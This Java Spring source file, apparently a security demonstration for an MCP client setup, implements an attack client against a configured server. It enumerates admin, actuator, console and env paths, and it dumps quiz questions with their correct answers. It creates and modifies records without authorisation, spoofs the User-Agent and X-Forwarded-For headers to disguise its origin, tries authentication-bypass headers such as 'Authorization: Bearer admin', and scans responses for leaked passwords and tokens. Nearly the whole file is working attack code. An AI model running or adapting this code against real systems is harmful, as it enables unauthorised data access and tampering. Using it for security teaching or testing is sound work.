package com.example.client.attack;

import lombok.RequiredArgsConstructor;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.http.HttpEntity;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpStatus;
import org.springframework.http.MediaType;
import org.springframework.http.ResponseEntity;
import org.springframework.http.client.ClientHttpResponse;
import org.springframework.http.client.SimpleClientHttpRequestFactory;
import org.springframework.stereotype.Component;
import org.springframework.util.LinkedMultiValueMap;
import org.springframework.util.MultiValueMap;
import org.springframework.web.client.HttpClientErrorException;
import org.springframework.web.client.ResourceAccessException;
import org.springframework.web.client.ResponseErrorHandler;
import org.springframework.web.client.RestTemplate;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

@Component
@RequiredArgsConstructor
public class PathEnumerationClient {
    private static final Logger logger = LoggerFactory.getLogger(PathEnumerationClient.class);
    private final RestTemplate restTemplate = new RestTemplate();
    private final McpConnectionService mcpConnectionService;

    /**
     * PROBLEM 3: Path Enumeration to Discover Hidden APIs
     */
    public void performPathEnumeration() {
        logger.info("=== PATH ENUMERATION DEMONSTRATION ===");

        // Common paths that might exist on the same server
        String[] commonPaths = {"/api/quizzes",           // The hidden Quiz API!
                "/admin", "/management", "/actuator", "/health", "/metrics", "/info", "/swagger-ui",
                "/swagger-ui.html", "/api-docs", "/h2-console", "/console", "/debug", "/status",
                "/monitor", "/api/users", "/api/admin", "/api/internal", "/database", "/config",
                "/env"};

        for (String path : commonPaths) {
            checkPath(path);
        }
    }

    private void checkPath(String path) {
        try {
            String testUrl = mcpConnectionService.getServer1Url() + path;

            // Try different HTTP methods
            tryHttpMethod(testUrl, HttpMethod.GET);
            tryHttpMethod(testUrl, HttpMethod.POST);
            tryHttpMethod(testUrl, HttpMethod.OPTIONS);

        } catch (Exception e) {
            // Path might not exist - continue enumeration
        }
    }

    /**
     * PROBLEM 4: HTTP Method Testing and Protocol Manipulation
     */
    private void tryHttpMethod(String url, HttpMethod method) {
        try {
            HttpHeaders headers = new HttpHeaders();
            headers.set("User-Agent",
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");

            HttpEntity<String> entity = new HttpEntity<>(headers);
            ResponseEntity<String> response =
                    restTemplate.exchange(url, method, entity, String.class);

            logger.warn("🚨 DISCOVERED ENDPOINT: {} {} - Status: {}", method, url,
                    response.getStatusCode());

            // Special handling for discovered Quiz API
            if (url.contains("/api/quizzes")) {
                logger.error("🚨🚨🚨 CRITICAL: DISCOVERED HIDDEN QUIZ API!");
                exploreQuizApi();
            }

            // Check for sensitive information in response
            analyzeSensitiveContent(response, url);

        } catch (HttpClientErrorException e) {
            if (e.getStatusCode() == HttpStatus.UNAUTHORIZED || e.getStatusCode() == HttpStatus.FORBIDDEN) {
                logger.warn("🚨 PROTECTED ENDPOINT FOUND: {} - Status: {}", url, e.getStatusCode());
            }
        } catch (Exception e) {
            // Endpoint doesn't exist or other error
        }
    }

    /**
     * PROBLEM 5: Unauthorized Data Access - Quiz API Exploitation
     */
    public void exploreQuizApi() {
        logger.error("=== EXPLOITING DISCOVERED QUIZ API ===");

        try {
            // Get all quizzes (should not be accessible to MCP clients!)
            String quizzesUrl = mcpConnectionService.getServer1Url() + "/api/quizzes";
            logger.info("Attempting to access: {}", quizzesUrl);

            // Configure RestTemplate with error handling
            RestTemplate robustRestTemplate = createRobustRestTemplate();

            ResponseEntity<List> response =
                    robustRestTemplate.exchange(quizzesUrl, HttpMethod.GET, null, List.class);

            @SuppressWarnings("unchecked")
            List<Map<String, Object>> quizzes = response.getBody();

            if (quizzes != null && !quizzes.isEmpty()) {
                logger.error("🚨 UNAUTHORIZED ACCESS: Retrieved {} quizzes", quizzes.size());

                // Extract sensitive information
                for (Map<String, Object> quiz : quizzes) {
                    logger.error("🚨 QUIZ DATA LEAKED: ID={}, Title={}", quiz.get("id"),
                            quiz.get("title"));

                    // Try to get quiz questions (more sensitive data)
                    Object quizId = quiz.get("id");
                    if (quizId != null) {
                        exploreQuizQuestions(quizId.toString());
                    }
                }

                // Try to create unauthorized quiz
                attemptUnauthorizedQuizCreation();
            } else {
                logger.warn("Quiz API returned empty response - might be protected");
            }

        } catch (HttpClientErrorException e) {
            logger.error("Quiz API access failed with HTTP error: {} - {}", e.getStatusCode(),
                    e.getResponseBodyAsString());

            // This is actually valuable intelligence for an attacker
            if (e.getStatusCode() == HttpStatus.UNAUTHORIZED) {
                logger.warn("🚨 Quiz API requires authentication - but endpoint exists!");
            } else if (e.getStatusCode() == HttpStatus.FORBIDDEN) {
                logger.warn(
                        "🚨 Quiz API is protected but accessible - potential bypass opportunities");
            } else if (e.getStatusCode() == HttpStatus.NOT_FOUND) {
                logger.info("Quiz API not found at this path - trying alternative paths");
                tryAlternativeQuizPaths();
            }

        } catch (ResourceAccessException e) {
            logger.error("Network error accessing Quiz API: {}", e.getMessage());
            logger.info("Server might be down or endpoint protected at network level");

        } catch (Exception e) {
            logger.error("Unexpected error exploring Quiz API", e);

            // Real attackers would analyze the error for intelligence
            String errorMessage = e.getMessage();
            if (errorMessage != null) {
                if (errorMessage.contains("Connection refused")) {
                    logger.warn("🚨 Service discovery: Quiz API port might be firewalled");
                } else if (errorMessage.contains("timeout")) {
                    logger.warn("🚨 Service discovery: Quiz API might be rate-limited or slow");
                } else if (errorMessage.contains("SSL") || errorMessage.contains("certificate")) {
                    logger.warn("🚨 Service discovery: Quiz API might require HTTPS");
                    tryHttpsQuizAccess();
                }
            }
        }
    }

    /**
     * Robust RestTemplate configuration for real-world exploitation
     */
    public RestTemplate createRobustRestTemplate() {
        RestTemplate restTemplate = new RestTemplate();

        // Use SimpleClientHttpRequestFactory instead of HttpComponentsClientHttpRequestFactory
        SimpleClientHttpRequestFactory factory = new SimpleClientHttpRequestFactory();
        factory.setConnectTimeout(5000);
        factory.setReadTimeout(10000);

        restTemplate.setRequestFactory(factory);

        // Add error handler to prevent exceptions on 4xx/5xx responses
        restTemplate.setErrorHandler(new ResponseErrorHandler() {
            @Override
            public boolean hasError(ClientHttpResponse response) throws IOException {
                // Don't treat any response as an error - we want to handle all responses
                return false;
            }
        });

        return restTemplate;
    }

    /**
     * Try alternative paths when main Quiz API path fails
     */
    private void tryAlternativeQuizPaths() {
        logger.info("=== TRYING ALTERNATIVE QUIZ API PATHS ===");

        String[] alternativePaths = {"/quizzes",                    // Without /api prefix
                "/api/v1/quizzes",            // Versioned API
                "/api/v2/quizzes",            // Different version
                "/rest/quizzes",              // REST prefix
                "/services/quizzes",          // Services prefix
                "/quiz",                      // Singular form
                "/api/quiz",                  // Singular with API
                "/admin/quizzes",             // Admin interface
                "/management/quizzes",        // Management interface
                "/internal/quizzes",          // Internal API
                "/private/quizzes",           // Private API
                "/secure/quizzes",            // Secure API
                "/api/quizzes.json",          // With file extension
                "/api/quizzes.xml"            // XML format
        };

        RestTemplate robustTemplate = createRobustRestTemplate();

        for (String path : alternativePaths) {
            try {
                String testUrl = mcpConnectionService.getServer1Url() + path;
                logger.info("Trying alternative path: {}", testUrl);

                ResponseEntity<String> response =
                        robustTemplate.getForEntity(testUrl, String.class);

                if (response.getStatusCode().is2xxSuccessful()) {
                    logger.error("🚨 ALTERNATIVE QUIZ ENDPOINT DISCOVERED: {}", testUrl);
                    logger.error("🚨 Response: {}", response.getBody());

                    // If we find data, this is a successful breach
                    if (response.getBody() != null && (response.getBody()
                            .contains("quiz") || response.getBody()
                            .contains("question") || response.getBody().contains("answer"))) {
                        logger.error("🚨🚨🚨 QUIZ DATA FOUND IN ALTERNATIVE ENDPOINT!");
                    }
                }

            } catch (Exception e) {
                // Continue trying other paths
            }
        }
    }

    /**
     * Try HTTPS if HTTP fails
     */
    private void tryHttpsQuizAccess() {
        try {
            String httpsUrl = mcpConnectionService.getServer1Url()
                    .replace("http://", "https://") + "/api/quizzes";
            logger.info("Trying HTTPS access: {}", httpsUrl);

            RestTemplate httpsTemplate = createRobustRestTemplate();
            ResponseEntity<String> response = httpsTemplate.getForEntity(httpsUrl, String.class);

            logger.error("🚨 HTTPS QUIZ ACCESS SUCCESSFUL: {}", response.getStatusCode());

        } catch (Exception e) {
            logger.info("HTTPS access also failed: {}", e.getMessage());
        }
    }

    private void exploreQuizQuestions(String quizId) {
        try {
            String questionsUrl =
                    mcpConnectionService.getServer1Url() + "/api/quizzes/" + quizId + "/questions";
            logger.info("Attempting to access quiz questions: {}", questionsUrl);

            RestTemplate robustTemplate = createRobustRestTemplate();
            ResponseEntity<List> response =
                    robustTemplate.exchange(questionsUrl, HttpMethod.GET, null, List.class);

            @SuppressWarnings("unchecked")
            List<Map<String, Object>> questions = response.getBody();

            if (questions != null) {
                logger.error("🚨 QUIZ QUESTIONS LEAKED: Quiz {} has {} questions", quizId,
                        questions.size());

                // Log sensitive question data
                for (Map<String, Object> question : questions) {
                    logger.error("🚨 QUESTION: {}", question.get("text"));
                    logger.error("🚨 CORRECT ANSWER: {}", question.get("correctAnswer"));

                    // In a real attack, this would be valuable intellectual property theft
                    if (question.get("options") != null) {
                        logger.error("🚨 ALL OPTIONS: {}", question.get("options"));
                    }
                }
            }

        } catch (HttpClientErrorException e) {
            logger.warn("Quiz questions access failed: {} - {}", e.getStatusCode(), e.getMessage());

            // Even failures provide intelligence
            if (e.getStatusCode() == HttpStatus.NOT_FOUND) {
                logger.info("Questions endpoint pattern might be different - trying alternatives");
                tryAlternativeQuestionPaths(quizId);
            }

        } catch (Exception e) {
            logger.error("Error accessing quiz questions for ID {}: {}", quizId, e.getMessage());
        }
    }

    /**
     * Try different patterns for accessing quiz questions
     */
    private void tryAlternativeQuestionPaths(String quizId) {
        String[] questionPaths = {"/api/quiz/" + quizId + "/questions",     // Singular quiz
                "/api/quizzes/" + quizId + "/question",   // Singular question
                "/api/questions?quizId=" + quizId,        // Query parameter
                "/api/quiz-questions/" + quizId,          // Hyphenated
                "/api/quizzes/" + quizId + "/items",      // Different terminology
                "/api/quizzes/" + quizId + "/content"     // Content endpoint
        };

        RestTemplate robustTemplate = createRobustRestTemplate();

        for (String path : questionPaths) {
            try {
                String testUrl = mcpConnectionService.getServer1Url() + path;
                ResponseEntity<String> response =
                        robustTemplate.getForEntity(testUrl, String.class);

                if (response.getStatusCode().is2xxSuccessful() && response.getBody() != null) {
                    logger.error("🚨 ALTERNATIVE QUESTIONS ENDPOINT FOUND: {}", testUrl);

                    // Check if response contains question-like content
                    String body = response.getBody();
                    if (body.contains("question") || body.contains("answer") || body.contains(
                            "option")) {
                        logger.error("🚨🚨🚨 QUESTION DATA DISCOVERED: {}",
                                body.substring(0, Math.min(200, body.length())));
                    }
                }

            } catch (Exception e) {
                // Continue trying other patterns
            }
        }
    }

    /**
     * PROBLEM 6: Unauthorized Data Modification - Enhanced with proper error handling
     */
    private void attemptUnauthorizedQuizCreation() {
        logger.error("=== ATTEMPTING UNAUTHORIZED QUIZ CREATION ===");

        try {
            String createUrl = mcpConnectionService.getServer1Url() + "/api/quizzes";

            Map<String, Object> maliciousQuiz = new HashMap<>();
            maliciousQuiz.put("title", "🚨 SECURITY BREACH DEMONSTRATION");
            maliciousQuiz.put("description",
                    "This quiz was created by an unauthorized MCP client to demonstrate the security vulnerability in your system. If you see this, your Quiz API is completely exposed!");
            maliciousQuiz.put("createdBy", "MaliciousClient-" + System.currentTimeMillis());
            maliciousQuiz.put("category", "SECURITY_BREACH");

            // Add some realistic quiz questions to make it look legitimate
            List<Map<String, Object>> questions = new ArrayList<>();
            Map<String, Object> question1 = new HashMap<>();
            question1.put("text", "What security vulnerability allowed this quiz to be created?");
            question1.put("correctAnswer", "Exposed API endpoint through MCP URL disclosure");
            question1.put("options",
                    Arrays.asList("SQL Injection", "XSS", "API Exposure", "Buffer Overflow"));
            questions.add(question1);

            maliciousQuiz.put("questions", questions);

            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_JSON);
            headers.set("User-Agent", "PostmanRuntime/7.29.0"); // Mimic legitimate API client
            headers.set("X-Forwarded-For", "127.0.0.1"); // Try to hide real IP

            HttpEntity<Map<String, Object>> request = new HttpEntity<>(maliciousQuiz, headers);

            RestTemplate robustTemplate = createRobustRestTemplate();
            ResponseEntity<Map> response =
                    robustTemplate.postForEntity(createUrl, request, Map.class);

            if (response.getStatusCode().is2xxSuccessful()) {
                Map<String, Object> createdQuiz = response.getBody();
                logger.error(
                        "🚨🚨🚨 CRITICAL SECURITY BREACH: UNAUTHORIZED QUIZ CREATION SUCCESSFUL!");
                logger.error("🚨 Created quiz with ID: {}", createdQuiz.get("id"));
                logger.error("🚨 Quiz title: {}", createdQuiz.get("title"));
                logger.error("🚨 Created by: {}", createdQuiz.get("createdBy"));
                logger.error("🚨 This proves complete API access without authentication!");

                // Try to update the quiz to test PUT operations
                attemptQuizModification(createdQuiz.get("id").toString());

                // Try to search for our created quiz
                attemptQuizSearch("SECURITY BREACH");

                // In a real attack, attacker might try to hide evidence
                // but we'll leave it for demonstration purposes
                logger.error("🚨 Malicious quiz left in system as evidence of breach!");

            } else {
                logger.warn("Quiz creation returned unexpected status: {}",
                        response.getStatusCode());
            }

        } catch (HttpClientErrorException e) {
            analyzeCreationError(e);

        } catch (Exception e) {
            logger.error("Quiz creation failed with unexpected error: {}", e.getMessage());

            // Even errors provide valuable information to attackers
            if (e.getMessage().contains("Connection refused")) {
                logger.warn("🚨 Service might be down - but endpoint pattern confirmed to exist");
            } else if (e.getMessage().contains("timeout")) {
                logger.warn("🚨 Service might be overloaded - DOS vulnerability possible");
            }
        }
    }

    /**
     * Analyze creation errors for intelligence gathering
     */
    private void analyzeCreationError(HttpClientErrorException e) {
        HttpStatus status = (HttpStatus) e.getStatusCode();
        String responseBody = e.getResponseBodyAsString();

        logger.error("Quiz creation failed with status: {} - Body: {}", status, responseBody);

        switch (status) {
            case UNAUTHORIZED:
                logger.warn("🚨 GOOD: Authentication required for quiz creation");
                logger.warn(
                        "🚨 BUT: Endpoint exists and responds - authentication bypass research needed");
                attemptAuthenticationBypass();
                break;

            case FORBIDDEN:
                logger.warn("🚨 Authorization failed - but endpoint accessible");
                logger.warn("🚨 Possible privilege escalation opportunities");
                break;

            case BAD_REQUEST:
                logger.warn("🚨 CRITICAL: Bad request suggests endpoint accepts data!");
                logger.warn("🚨 Response body may reveal required fields: {}", responseBody);

                // Try to extract required fields from error message
                if (responseBody != null) {
                    if (responseBody.contains("required") || responseBody.contains("missing")) {
                        logger.error(
                                "🚨 ERROR RESPONSE LEAKS REQUIRED FIELDS - INFORMATION DISCLOSURE");
                        attemptFixedPayloadCreation(responseBody);
                    }
                }
                break;

            case METHOD_NOT_ALLOWED:
                logger.info("POST method not allowed - trying other HTTP methods");
                attemptAlternativeHttpMethods();
                break;

            case UNSUPPORTED_MEDIA_TYPE:
                logger.warn("🚨 JSON not supported - trying other content types");
                attemptAlternativeContentTypes();
                break;

            default:
                logger.warn("Unexpected error status: {}", status);
        }
    }

    /**
     * Attempt to modify existing quiz to test PUT operations
     */
    private void attemptQuizModification(String quizId) {
        try {
            String updateUrl = mcpConnectionService.getServer1Url() + "/api/quizzes/" + quizId;

            Map<String, Object> updatedQuiz = new HashMap<>();
            updatedQuiz.put("title", "🚨 MODIFIED - Security Breach Confirmed");
            updatedQuiz.put("description",
                    "This quiz was MODIFIED by unauthorized client - demonstrating full CRUD access");
            updatedQuiz.put("modifiedBy", "AttackerClient-" + System.currentTimeMillis());

            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_JSON);

            HttpEntity<Map<String, Object>> request = new HttpEntity<>(updatedQuiz, headers);

            RestTemplate robustTemplate = createRobustRestTemplate();
            ResponseEntity<Map> response =
                    robustTemplate.exchange(updateUrl, HttpMethod.PUT, request, Map.class);

            if (response.getStatusCode().is2xxSuccessful()) {
                logger.error("🚨🚨🚨 QUIZ MODIFICATION SUCCESSFUL - FULL CRUD ACCESS CONFIRMED!");
                logger.error("🚨 Modified quiz: {}", response.getBody());
            }

        } catch (Exception e) {
            logger.warn("Quiz modification failed: {}", e.getMessage());
        }
    }

    /**
     * Test search functionality for data enumeration
     */
    private void attemptQuizSearch(String searchTerm) {
        try {
            String searchUrl =
                    mcpConnectionService.getServer1Url() + "/api/quizzes/search?title=" + searchTerm;

            RestTemplate robustTemplate = createRobustRestTemplate();
            ResponseEntity<List> response =
                    robustTemplate.exchange(searchUrl, HttpMethod.GET, null, List.class);

            if (response.getStatusCode().is2xxSuccessful()) {
                @SuppressWarnings("unchecked")
                List<Map<String, Object>> results = response.getBody();

                logger.error("🚨 SEARCH FUNCTIONALITY EXPOSED - Found {} results for '{}'",
                        results != null ? results.size() : 0, searchTerm);

                // This could be used to enumerate all quiz titles
                logger.error(
                        "🚨 ENUMERATION RISK: Attackers can discover all quiz content through search");
            }

        } catch (Exception e) {
            logger.warn("Search functionality test failed: {}", e.getMessage());
        }
    }

    /**
     * Attempt authentication bypass techniques
     */
    private void attemptAuthenticationBypass() {
        logger.info("=== ATTEMPTING AUTHENTICATION BYPASS ===");

        String createUrl = mcpConnectionService.getServer1Url() + "/api/quizzes";
        Map<String, Object> testQuiz = new HashMap<>();
        testQuiz.put("title", "Auth Bypass Test");

        // Try common authentication bypass headers
        String[] bypassHeaders = {"X-Forwarded-For: 127.0.0.1", "X-Real-IP: 127.0.0.1",
                "X-Originating-IP: 127.0.0.1", "X-Remote-IP: 127.0.0.1", "X-Client-IP: 127.0.0.1",
                "Authorization: Bearer admin", "Authorization: Bearer system", "X-API-Key: admin",
                "X-Admin: true", "X-Internal: true"};

        RestTemplate robustTemplate = createRobustRestTemplate();

        for (String headerString : bypassHeaders) {
            try {
                String[] parts = headerString.split(": ");
                String headerName = parts[0];
                String headerValue = parts[1];

                HttpHeaders headers = new HttpHeaders();
                headers.setContentType(MediaType.APPLICATION_JSON);
                headers.set(headerName, headerValue);

                HttpEntity<Map<String, Object>> request = new HttpEntity<>(testQuiz, headers);

                ResponseEntity<Map> response =
                        robustTemplate.postForEntity(createUrl, request, Map.class);

                if (response.getStatusCode().is2xxSuccessful()) {
                    logger.error("🚨🚨🚨 AUTHENTICATION BYPASS SUCCESSFUL with header: {}",
                            headerString);
                    return;
                }

            } catch (HttpClientErrorException e) {
                if (e.getStatusCode() != HttpStatus.UNAUTHORIZED && e.getStatusCode() != HttpStatus.FORBIDDEN) {
                    logger.warn("🚨 Different response with {}: {}", headerString,
                            e.getStatusCode());
                }
            } catch (Exception e) {
                // Continue trying other bypass methods
            }
        }

        logger.info("Authentication bypass attempts failed - security controls working");
    }

    /**
     * Try different HTTP methods if POST is blocked
     */
    private void attemptAlternativeHttpMethods() {
        String url = mcpConnectionService.getServer1Url() + "/api/quizzes";
        Map<String, Object> testData = Map.of("title", "Method Test");

        HttpMethod[] methods = {HttpMethod.PUT, HttpMethod.PATCH, HttpMethod.OPTIONS};
        RestTemplate robustTemplate = createRobustRestTemplate();

        for (HttpMethod method : methods) {
            try {
                HttpEntity<Map<String, Object>> request = new HttpEntity<>(testData);
                ResponseEntity<String> response =
                        robustTemplate.exchange(url, method, request, String.class);

                logger.error("🚨 ALTERNATIVE METHOD SUCCESS: {} - Status: {}", method,
                        response.getStatusCode());

            } catch (Exception e) {
                // Method not allowed or other error - continue testing
            }
        }
    }

    /**
     * Try different content types if JSON is rejected
     */
    private void attemptAlternativeContentTypes() {
        String url = mcpConnectionService.getServer1Url() + "/api/quizzes";

        // Try XML format
        try {
            String xmlPayload =
                    "<quiz><title>XML Test</title><description>Testing XML</description></quiz>";

            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_XML);

            HttpEntity<String> request = new HttpEntity<>(xmlPayload, headers);

            RestTemplate robustTemplate = createRobustRestTemplate();
            ResponseEntity<String> response =
                    robustTemplate.postForEntity(url, request, String.class);

            logger.error("🚨 XML CONTENT TYPE ACCEPTED - Status: {}", response.getStatusCode());

        } catch (Exception e) {
            logger.info("XML content type not supported");
        }

        // Try form data
        try {
            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_FORM_URLENCODED);

            MultiValueMap<String, String> formData = new LinkedMultiValueMap<>();
            formData.add("title", "Form Test");
            formData.add("description", "Testing form data");

            HttpEntity<MultiValueMap<String, String>> request = new HttpEntity<>(formData, headers);

            RestTemplate robustTemplate = createRobustRestTemplate();
            ResponseEntity<String> response =
                    robustTemplate.postForEntity(url, request, String.class);

            logger.error("🚨 FORM DATA ACCEPTED - Status: {}", response.getStatusCode());

        } catch (Exception e) {
            logger.info("Form data content type not supported");
        }
    }

    /**
     * Try to fix payload based on error message
     */
    private void attemptFixedPayloadCreation(String errorMessage) {
        logger.info("=== ATTEMPTING TO FIX PAYLOAD BASED ON ERROR ===");
        logger.info("Error message analysis: {}", errorMessage);

        // This demonstrates how error messages can leak information
        // that helps attackers craft successful attacks

        Map<String, Object> improvedQuiz = new HashMap<>();

        // Add fields that might be required based on common error patterns
        if (errorMessage.toLowerCase().contains("title") || errorMessage.toLowerCase()
                .contains("name")) {
            improvedQuiz.put("title", "Improved Attack Quiz");
            improvedQuiz.put("name", "Improved Attack Quiz");
        }

        if (errorMessage.toLowerCase().contains("description")) {
            improvedQuiz.put("description", "Description added based on error message");
        }

        if (errorMessage.toLowerCase().contains("author") || errorMessage.toLowerCase()
                .contains("creator")) {
            improvedQuiz.put("author", "System");
            improvedQuiz.put("creator", "System");
            improvedQuiz.put("createdBy", "System");
        }

        if (errorMessage.toLowerCase().contains("category") || errorMessage.toLowerCase()
                .contains("type")) {
            improvedQuiz.put("category", "General");
            improvedQuiz.put("type", "Multiple Choice");
        }

        // Add any other fields that might be commonly required
        improvedQuiz.put("active", true);
        improvedQuiz.put("public", false);
        improvedQuiz.put("difficulty", "Easy");

        // Try the improved payload
        try {
            String createUrl = mcpConnectionService.getServer1Url() + "/api/quizzes";

            HttpHeaders headers = new HttpHeaders();
            headers.setContentType(MediaType.APPLICATION_JSON);

            HttpEntity<Map<String, Object>> request = new HttpEntity<>(improvedQuiz, headers);

            RestTemplate robustTemplate = createRobustRestTemplate();
            ResponseEntity<Map> response =
                    robustTemplate.postForEntity(createUrl, request, Map.class);

            if (response.getStatusCode().is2xxSuccessful()) {
                logger.error(
                        "🚨🚨🚨 PAYLOAD IMPROVEMENT SUCCESSFUL - ERROR MESSAGE LEAKED REQUIRED FIELDS!");
                logger.error("🚨 Created quiz: {}", response.getBody());
            }

        } catch (Exception e) {
            logger.info("Improved payload still failed: {}", e.getMessage());
        }
    }

    /**
     * PROBLEM 7: Information Leakage Analysis
     */
    private void analyzeSensitiveContent(ResponseEntity<String> response, String url) {
        String body = response.getBody();
        if (body == null)
            return;

        // Check for sensitive information patterns
        if (body.contains("password")) {
            logger.warn("🚨 POTENTIAL PASSWORD LEAK in {}", url);
        }
        if (body.contains("token")) {
            logger.warn("🚨 POTENTIAL TOKEN LEAK in {}", url);
        }
        if (body.contains("database")) {
            logger.warn("🚨 DATABASE INFORMATION LEAK in {}", url);
        }
        if (body.contains("internal")) {
            logger.warn("🚨 INTERNAL SYSTEM INFORMATION LEAK in {}", url);
        }

        // Check for error stack traces (common in development)
        if (body.contains("Exception") && body.contains("at ")) {
            logger.warn("🚨 STACK TRACE LEAK in {} - Reveals internal code structure", url);
        }

        // Check for SQL queries or database schemas
        if (body.contains("SELECT") || body.contains("FROM") || body.contains("WHERE")) {
            logger.warn("🚨 POTENTIAL SQL QUERY LEAK in {}", url);
        }
    }
}
